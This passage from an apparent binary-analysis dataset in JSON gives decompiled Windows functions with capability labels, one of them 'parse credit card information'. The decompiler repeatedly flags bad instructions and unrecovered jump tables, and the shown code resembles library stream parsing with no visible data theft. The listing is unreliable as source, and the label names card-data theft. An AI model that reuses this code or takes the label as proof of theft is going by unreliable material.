CONCAT48(0xffffffff, auStack440);\n                    piVar21 = 0xffffffff;\n                    cVar7 = '\\x01';\n                    piVar28 = 0x1;\n                    piVar30 = piVar28;\n                } while (piVar27 == NULL);\n            } while( true );\n        case 0x5b:\n            pcVar19 = auStack280._0_8_ & 0xffffffffffffffab;\n            *pcVar19 = *pcVar19 + pcVar19;\n            *piVar22 = *piVar22 + -0x1b;\n            *piVar22 = *piVar22 << (uVar23 & 0x1f);\n            piVar26 = piVar21 + 1;\n            goto code_r0x000140065845;\n        case 0x5c:\n            goto code_r0x0001400657d8;\n        case 0x5d:\n            *auStack280._0_8_ = *auStack280._0_8_ + auStack280._0_8_;\n            piVar21 = uVar15 + 0x1400fe678;\n            _auStack440 = auVar33;\n            piStack312 = piVar22;\n            fcn.1400b36a0(piVar21);\n            arg3 = fcn.1400261c0(0x1400fb3f0);\n            goto code_r0x0001400657d8;\n        case 0x5e:\n            *auStack280._0_8_ = *auStack280._0_8_ + auStack280._0_8_;\ncode_r0x000140065920:\n            while( true ) {\n                iVar11 = uVar16;\n                uVar16 = uVar16 + 1;\n                uVar24 = arg1_01;\n                if ((iVar11 + 1 < 4 & uVar24) == 0) break;\ncode_r0x0001400658c2:\n                if (*(*(piVar26 + 0x60) + uVar16) < 5) {\n    // WARNING: Could not recover jumptable at 0x0001400658e5. Too many branches\n    // WARNING: Treating indirect jump as call\n                    piVar21 = (*(*(*(*(piVar26 + 0x60) + uVar16) * 4 + 0x1400fe710) + 0x1400fe710))();\n                    return piVar21;\n                }\n                arg1_01 = 0x1;\n            }\n            if ((1 < *(piVar26 + 0x50) & uVar24) == 0) {\n                if (uVar24 != 0) {\n                    uVar16 = *(*(piVar26 + 0xb8) + -0x18);\njoined_r0x00014006634b:\n                    if (1 < uVar16) {\n                        uVar18 = *(piVar26 + 0x30);\n                        *(piVar26 + -8) = 0x140066425;\n                        uVar16 = fcn.14001ef10(uVar18, 0x30, 0);\n                        if (uVar16 != 0) {\n                            uVar15 = *(*(piVar26 + 0xb8) + -0x18);\n                            if (uVar16 == 0xffffffffffffffff) {\n                                uVar16 = uVar15 - 1;\n                            }\n                            if (uVar16 <= uVar15) {\n                                uVar15 = uVar16;\n                            }\n                            *(piVar26 + -8) = 0x14006645a;\n                            fcn.140077920(uVar18, 0, uVar15, 0);\n                        }\n                    }\n                    if (*(piVar26 + 0x7e) != '\\0') {\n                        pcVar19 = *(piVar26 + 0xb8);\n                        if (-1 < *(pcVar19 + -8)) {\n                            *(piVar26 + -8) = 0x1400666bc;\n                            fcn.1400758a0(*(piVar26 + 0x30));\n                            pcVar19 = *(piVar26 + 0xb8);\n                        }\n                        if (*pcVar19 != '0') {\n                            uVar18 = *(piVar26 + 0x30);\n                            *(piVar26 + -8) = 0x14006660a;\n                            fcn.140077160(uVar18);\n                            *(piVar26 + 0x20) = 0x2d;\n                            *(piVar26 + -8) = 0x140066625;\n                            fcn.140075d80(uVar18, 0, 0, 1);\n                            *(*(piVar26 + 0xb8) + -8) = 0xffffffff;\n                        }\n                    }\n                    if (*(*(piVar26 + 0xb0) + -0x18) != 0) {\n                        cVar7 = arg3;\n                        if (*(piVar26 + 0x7d) != '\\0') {\n                            cVar7 = *(piVar26 + 0x78);\n                        }\n                        *(piVar26 + -8) = 0x14006638b;\n                        fcn.140077ac0(piVar26 + 0xb0, cVar7);\n                        uVar18 = *(UNRECOVERED_JUMPTABLE + 0x18);\n                        arg1_00 = *(UNRECOVERED_JUMPTABLE + 0x10);\n                        *(piVar26 + -8) = 0x14006639b;\n                        cVar7 = fcn.1400b15c0(arg1_00, uVar18, piVar26 + 0xb0);\n                        if (cVar7 == '\\0') {\n                            **(piVar26 + 0x138) = **(piVar26 + 0x138) | 4;\n                        }\n                    }\n                    if ((*(piVar26 + 0x7d) == '\\0') || (*(UNRECOVERED_JUMPTABLE + 0x58) == arg3)) {\n                        *(piVar26 + -8) = 0x1400663cc;\n                        fcn.1400762a0(*(piVar26 + 0x140), *(piVar26 + 0x30));\n                        goto code_r0x000140065df4;\n                    }\n                }\n            }\n            else {\n                if (*(piVar26 + 0x7e) == '\\0') {\n                    iVar13 = *(UNRECOVERED_JUMPTABLE + 0x38);\n                }\n                else {\n                    iVar13 = *(UNRECOVERED_JUMPTABLE + 0x48);\n                }\n                iVar11 = *(piVar26 + 0x98);\n                piVar21 = *(piVar26 + 0x90);\n                uVar16 = 1;\n                while( true ) {\n                    bVar32 = iVar11 == -1;\n                    bVar31 = bVar32;\n                    if (((piVar21 != NULL) && (bVar32)) && (bVar31 = false,  piVar21[3] <= piVar21[2])) {\n                        pcVar36 = *(*piVar21 + 0x48);\n                        *(piVar26 + -8) = 0x140065ae4;\n                        iVar12 = (*pcVar36)(piVar21);\n                        bVar31 = iVar12 == -1;\n                        if (bVar31) {\n                            *(piVar26 + 0x90) = 0;\n                        }\n                    }\n                    piVar21 = *(piVar26 + 0x80);\n                    if ((piVar21 == NULL) || (*(piVar26 + 0x88) != -1)) {\n                        bVar31 = bVar31 ^ *(piVar26 + 0x88) == -1;\n                    }\n                    else if (piVar21[3] <= piVar21[2]) {\n                        pcVar36 = *(*piVar21 + 0x48);\n                        *(piVar26 + -8) = 0x140066224;\n                        iVar12 = (*pcVar36)();\n                        bVar31 = bVar31 ^ iVar12 == -1;\n                        if (iVar12 == -1) {\n                            *(piVar26 + 0x80) = 0;\n                        }\n                    }\n                    if ((*(piVar26 + 0x50) <= uVar16) || (!bVar31)) break;\n                    piVar21 = *(piVar26 + 0x90);\n                    if ((piVar21 == NULL) || (!bVar32)) {\ncode_r0x000140065a73:\n                        if (*(iVar13 + uVar16) != iVar11) goto code_r0x000140065de9;\n                        piVar21 = *(piVar26 + 0x90);\n                        pcVar19 = piVar21[2];\n                        if (pcVar19 < piVar21[3]) goto code_r0x000140065a93;\n                        pcVar36 = *(*piVar21 + 0x50);\n                        *(piVar26 + -8) = 0x140066319;\n                        (*pcVar36)(piVar21);\n                    }\n                    else {\n                        pcVar19 = piVar21[2];\n                        if (piVar21[3] <= pcVar19) {\n                            pcVar36 = *(*piVar21 + 0x48);\n                            *(piVar26 + -8) = 0x14006666f;\n                            iVar11 = (*pcVar36)(piVar21);\n                            if (iVar11 == -1) {\n                                *(piVar26 + 0x90) = 0;\n                            }\n                            goto code_r0x000140065a73;\n                        }\n                        if (*(iVar13 + uVar16) != *pcVar19) goto code_r0x000140065de9;\ncode_r0x000140065a93:\n                        piVar21[2] = pcVar19 + 1;\n                    }\n                    *(piVar26 + 0x98) = 0xffffffff;\n                    uVar16 = uVar16 + 1;\n                    iVar11 = -1;\n                }\n                if (uVar16 == *(piVar26 + 0x50)) {\n                    uVar16 = *(*(piVar26 + 0xb8) + -0x18);\n                    goto joined_r0x00014006634b;\n                }\n            }\ncode_r0x000140065de9:\n            **(piVar26 + 0x138) = **(piVar26 + 0x138) | 4;\ncode_r0x000140065df4:\n            *(piVar26 + -8) = 0x140065e09;\n            cVar7 = fcn.140023f10(piVar26 + 0x90, piVar26 + 0x80);\n            if (cVar7 != '\\0') {\n                **(piVar26 + 0x138) = **(piVar26 + 0x138) | 2;\n            }\n            puVar3 = *(piVar26 + 0x110);\n            uVar35 = *(piVar26 + 0x94);\n            uVar4 = *(piVar26 + 0x98);\n            uVar5 = *(piVar26 + 0x9c);\n            *puVar3 = *(piVar26 + 0x90);\n            puVar3[1] = uVar35;\n            puVar3[2] = uVar4;\n            puVar3[3] = uVar5;\n            *(piVar26 + -8) = 0x140065e42;\n            fcn.140075fa0(*(piVar26 + 0xb8) + -0x18);\n            *(piVar26 + -8) = 0x140065e58;\n            fcn.140075fa0(*(piVar26 + 0xb0) + -0x18);\n            return *(piVar26 + 0x110);\n        case 0x5f:\n        case 0x60:\n        case 0x61:\n        case 0x95:\n        case 0xb7:\n        case 0xc0:\n        case 0xc5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x62:\n        case 0x6d:\n        case 0x7c:\n        case 0x84:\n        case 0x96:\n        case 0xb8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 99:\n        case 0x85:\n        case 0x97:\n        case 0xb9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 100:\n        case 0x86:\n        case 0x98:\n        case 0xba:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x65:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x66:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x67:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x70:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x71:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x72:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x73:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x74:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x75:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x76:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x77:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x78:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x80:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x81:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x82:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x83:\n    // WARNING: Could not recover jumptable at 0x0001400fe61b. Too many branches\n    // WARNING: Treating indirect jump as call\n            piVar21 = (*UNRECOVERED_JUMPTABLE)();\n            return piVar21;\n        case 0x87:\n        case 0x99:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x88:\n        case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x89:\n        case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8a:\n        case 0x9c:\n        case 0xa3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8b:\n        case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8c:\n        case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8d:\n        case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8e:\n        case 0xa0:\n        case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8f:\n        case 0xa1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x91:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x92:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x93:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa9:\n            aiStackY584[UNRECOVERED_JUMPTABLE] = aiStackY584[UNRECOVERED_JUMPTABLE] + -1;\n            pcVar36 = swi(1);\n            piVar21 = (*pcVar36)();\n            return piVar21;\n        case 0xaa:\n        case 0xc6:\n        case 0xda:\n        case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xab:\n        case 199:\n        case 0xdb:\n        case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xac:\n        case 200:\n        case 0xdc:\n        case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xad:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xae:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb3:\n        case 0xd0:\n        case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb4:\n        case 0xbd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbe:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xca:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcf:\n        case 0xe0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd1:\n        case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf0:\n        case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf1:\n        case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf2:\n        case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x00014005d4a0:\n        piVar30 = CONCAT44(uStack404, uStack408);\n        piVar29 = piVar27;\ncode_r0x00014005d19d:\n        piVar27 = piVar27 + 1;\n        arg1_02 = arg3;\n        piVar22 = piVar29;\n    } while( true );\ncode_r0x0001400657d8:\n    ppcVar1 = *(*(auStack280._0_8_ + 0x34) + 0x18) + arg3 * 8;\n    UNRECOVERED_JUMPTABLE = *ppcVar1;\n    if (UNRECOVERED_JUMPTABLE == NULL) {\n        puVar20 = fcn.1400b6520(0x70);\n        *(puVar20 + 1) = 0;\n        *puVar20 = 0x14010b630;\n        puVar20[2] = 0;\n        puVar20[3] = 0;\n        *(puVar20 + 4) = 0;\n        *(puVar20 + 0x21) = 0;\n        puVar20[5] = 0;\n        puVar20[6] = 0;\n        puVar20[7] = 0;\n        puVar20[8] = 0;\n        puVar20[9] = 0;\n        puVar20[10] = 0;\n        *(puVar20 + 0xb) = 0;\n        *(puVar20 + 0x5c) = 0;\n        *(puVar20 + 0x6f) = 0;\n        fcn.140099da0(puVar20, piVar21);\n        fcn.14009d930(*(auStack280._0_8_ + 0xd0), puVar20, arg3);\n        UNRECOVERED_JUMPTABLE = *ppcVar1;\n    }\n    uVar18 = fcn.140075910(0, 0);\n    uStack408 = uVar18;\n    uStack404 = uVar18 >> 0x20;\n    piVar26 = aiStackY584;\n    if (UNRECOVERED_JUMPTABLE[0x20] != 0x0) {\n        fcn.140077810(&uStack408, 0x20);\n        piVar26 = aiStackY584;\n    }\ncode_r0x000140065845:\n    *(piVar26 + 0x70) = piVar26 + 0xab;\n    *(piVar26 + -8) = 0x14006585e;\n    uVar18 = fcn.140075910(0, 0);\n    *(piVar26 + 0xb8) = uVar18;\n    *(piVar26 + -8) = 0x140065875;\n    fcn.140077810(*(piVar26 + 0x30), 0x20);\n    *(piVar26 + 0x7d) = 0;\n    uVar16 = 0;\n    arg3 = NULL;\n    *(piVar26 + 0x40) = UNRECOVERED_JUMPTABLE + 0x65;\n    uVar35 = *(UNRECOVERED_JUMPTABLE + 0x60);\n    *(piVar26 + 0x78) = 0;\n    *(piVar26 + 0xac) = uVar35;\n    *(piVar26 + 0x60) = piVar26 + 0xac;\n    *(piVar26 + 0x50) = 0;\n    *(piVar26 + 0x7e) = 0;\n    *(piVar26 + 0x38) = piVar26 + 0xb0;\n    goto code_r0x0001400658c2;\n}\n",
        "token_count": 22865
    },
    "140061b1": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x000140004754) overlaps instruction at (ram,0x000140004753)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00014000476e)\n// WARNING: Removing unreachable block (ram,0x000140004773)\n// WARNING: Removing unreachable block (ram,0x00014000481f)\n// WARNING: Removing unreachable block (ram,0x000140004824)\n// WARNING: Removing unreachable block (ram,0x00014000482d)\n// WARNING: Removing unreachable block (ram,0x000140004778)\n// WARNING: Removing unreachable block (ram,0x000140004782)\n// WARNING: Removing unreachable block (ram,0x0001400047e8)\n// WARNING: Removing unreachable block (ram,0x0001400fec06)\n// WARNING: Removing unreachable block (ram,0x0001400fec02)\n// WARNING: Removing unreachable block (ram,0x0001400fec0a)\n// WARNING: Removing unreachable block (ram,0x0001400febfe)\n// WARNING: Removing unreachable block (ram,0x0001400febc6)\n// WARNING: Removing unreachable block (ram,0x0001400fec42)\n// WARNING: Removing unreachable block (ram,0x0001400fec7a)\n// WARNING: Removing unreachable block (ram,0x0001400fec8a)\n// WARNING: Removing unreachable block (ram,0x0001400fecbe)\n// WARNING: Removing unreachable block (ram,0x0001400fec3a)\n// WARNING: Removing unreachable block (ram,0x0001400fec3e)\n// WARNING: Removing unreachable block (ram,0x0001400fec46)\n// WARNING: Removing unreachable block (ram,0x0001400fec76)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Removing unreachable block (ram,0x0001400febde)\n// WARNING: Removing unreachable block (ram,0x0001400fec16)\n// WARNING: Removing unreachable block (ram,0x0001400febe2)\n// WARNING: Could not reconcile some variable overlaps\n\nuchar (**) [16] fcn.140061b10(uchar (**arg1) [16], ulong arg2)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uchar (*pauVar3) [16];\n    code *pcVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    int16_t iVar9;\n    ushort uVar10;\n    int16_t iVar11;\n    uint16_t uVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    char *pcVar15;\n    uchar (**ppauVar16) [16];\n    uchar *puVar17;\n    uchar (**ppauVar18) [16];\n    uchar *noname_10;\n    int64_t iVar19;\n    uint64_t uVar20;\n    int32_t *piVar21;\n    int64_t iVar22;\n    ulong uVar23;\n    ulong uVar24;\n    ulong *puVar25;\n    uint8_t uVar28;\n    int32_t *piVar27;\n    uchar (**ppauVar29) [16];\n    uchar (**ppauVar30) [16];\n    uchar (*pauVar31) [16];\n    code *pcVar32;\n    char cVar34;\n    uint64_t uVar33;\n    uchar *puVar35;\n    uchar (**unaff_RSI) [16];\n    uchar (**arg1_00) [16];\n    uchar *puVar36;\n    int64_t *piVar37;\n    bool bVar38;\n    char **arg3;\n    uint32_t *in_R8;\n    uint64_t uVar39;\n    uchar (*pauVar40) [16];\n    uchar (*in_R9) [16];\n    char cVar41;\n    bool bVar42;\n    bool bVar43;\n    bool bVar44;\n    uchar extraout_XMM0 [16];\n    uchar auVar45 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar in_XMM1 [16];\n    uchar (**in_stack_00000028) [16];\n    uint32_t *in_stack_00000030;\n    uchar (**in_stack_00000038) [16];\n    int64_t in_stack_00000040;\n    uchar (**in_stack_00000048) [16];\n    uchar (**ppauStackY576) [16];\n    uchar auStackY568 [16];\n    uint32_t uStackY552;\n    ulong uStackY544;\n    uchar (**in_stack_fffffffffffffdf8) [16];\n    uint uVar46;\n    uchar (**in_stack_fffffffffffffe08) [16];\n    uchar (**in_stack_fffffffffffffe10) [16];\n    uint64_t in_stack_fffffffffffffe20;\n    uint32_t uVar47;\n    uint32_t in_stack_fffffffffffffe34;\n    uchar in_stack_fffffffffffffe38 [16];\n    int16_t iStack432;\n    uchar auStack440 [12];\n    uchar auStack440_00 [16];\n    uchar auStack424 [8];\n    ulong uStack416;\n    uint uStack408;\n    uint uStack404;\n    uint16_t uStack400;\n    ushort uStack398;\n    uint uStack396;\n    uint32_t uStack392;\n    uint32_t uStack388;\n    uint16_t uStack384;\n    ushort uStack382;\n    uint32_t uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    uchar (*pauStack360) [16];\n    int16_t *piStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uchar (**ppauStack296) [16];\n    uint uStack288;\n    uint uStack284;\n    uchar auStack280 [16];\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint8_t *puVar26;\n    \n    puVar35 = &stack0xfffffffffffffdc8;\n    puVar36 = NULL;\n    uStack392 = *in_R8;\n    uStack388 = in_R8[1];\n    uStack380 = in_R8[3];\n    uStack408 = **in_R9;\n    uStack404 = *(*in_R9 + 4);\n    uStack396 = *(*in_R9 + 0xc);\n    uStack384 = in_R8[2];\n    uStack382 = in_R8[2] >> 0x10;\n    uStack400 = *(*in_R9 + 8);\n    uStack398 = *(*in_R9 + 8) >> 0x10;\n    ppauStackY576 = 0x140061b9d;\n    puVar17 = fcn.1400b3640(in_stack_00000028 + 0x1a);\n    ppauStackY576 = 0x140061baa;\n    ppauVar18 = fcn.1400b3700(in_stack_00000028 + 0x1a);\n    ppauStackY576 = 0x140061bba;\n    noname_10 = sub.msvcrt.dll_wcslen(in_stack_00000040);\n    pauVar40 = CONCAT44(uStack388, uStack392);\n    uStack368 = 0;\n    uVar47 = 0;\n    piVar37 = CONCAT44(uStack404, uStack408);\n    pauVar31 = in_stack_fffffffffffffe20 & 0xffffffffffff0000 | uStack400;\n    uVar33 = uStack384;\n    ppauVar16 = arg1;\n    do {\n        bVar42 = uVar33 == -1;\n        ppauVar16 = ppauVar16 & 0xffffffffffffff00 | bVar42;\n        auStack424 = in_R9;\n        bVar38 = bVar42;\n        if ((pauVar40 != NULL) && (bVar42)) {\n            if (*pauVar40[1] < *(pauVar40[1] + 8)) {\n                iVar9 = **pauVar40[1];\n            }\n            else {\n                ppauStackY576 = 0x1400621b9;\n                iVar9 = (**(**pauVar40 + 0x48))(pauVar40);\n            }\n            if (iVar9 == -1) {\n                uStack392 = 0;\n                uStack388 = 0;\n            }\n            auStack424 = in_R9;\n            bVar38 = iVar9 == -1;\n        }\n        bVar43 = pauVar31 == -1;\n        arg1_00 = unaff_RSI & 0xffffffffffffff00 | bVar43;\n        if ((piVar37 != NULL) && (bVar43)) {\n            if (piVar37[2] < piVar37[3]) {\n                iVar9 = *piVar37[2];\n            }\n            else {\n                ppauStackY576 = 0x1400621a2;\n                iVar9 = (**(*piVar37 + 0x48))(piVar37);\n            }\n            if (iVar9 == -1) {\n                uStack408 = 0;\n                uStack404 = 0;\n            }\n            bVar44 = iVar9 == -1;\n            if (puVar36 < noname_10) goto code_r0x000140061c51;\ncode_r0x000140061d98:\n            if ((puVar36 == noname_10) && (uVar47 == 0)) goto code_r0x000140061dbf;\ncode_r0x000140061dba:\n            *in_stack_00000030 = *in_stack_00000030 | 4;\ncode_r0x000140061dbf:\n            *arg1 = uStack392;\n            *(arg1 + 4) = uStack388;\n            *(arg1 + 1) = CONCAT22(uStack382, uStack384);\n            *(arg1 + 0xc) = uStack380;\n            return arg1;\n        }\n        bVar44 = bVar43;\n        if (noname_10 <= puVar36) goto code_r0x000140061d98;\ncode_r0x000140061c51:\n        if (bVar38 == bVar44) goto code_r0x000140061d98;\n        if (uVar47 != 0) goto code_r0x000140061dba;\n        iVar19 = puVar36 * 2;\n        ppauStackY576 = 0x140061c87;\n        cVar5 = (**(*ppauVar18)[6])(ppauVar18);\n        if (cVar5 != '%') {\n            ppauStackY576 = 0x140061ca3;\n            iVar19 = (**(*ppauVar18)[1])(ppauVar18);\n            pauVar40 = CONCAT44(uStack388, uStack392);\n            if (iVar19 != '\\0') {\n                piVar37 = CONCAT44(uStack404, uStack408);\n                do {\n                    bVar38 = uVar33 == -1;\n                    uVar13 = iVar19 & 0xffffff00;\n                    uVar6 = pauVar40 != NULL && 